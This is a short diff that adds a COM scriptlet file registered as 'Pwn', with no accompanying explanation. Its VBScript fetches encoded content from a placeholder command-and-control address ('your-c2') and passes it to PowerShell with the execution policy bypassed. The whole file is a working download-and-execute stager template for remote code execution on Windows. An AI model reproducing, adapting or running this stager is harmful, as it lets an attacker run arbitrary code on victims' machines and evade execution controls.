@@ -1,0 +1,14 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="Pwn" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
+<script language="VBScript">
+<![CDATA[
+Set obj = CreateObject("MSXML2.XMLHTTP")
+obj.open "GET", "https://your-c2/encoded", False
+obj.send
+Set shel = CreateObject("WScript.Shell")
+shel.Exec("powershell -ep bypass -enc " & obj.responseText)
+]]>
+</script>
+</registration>
+</scriptlet>
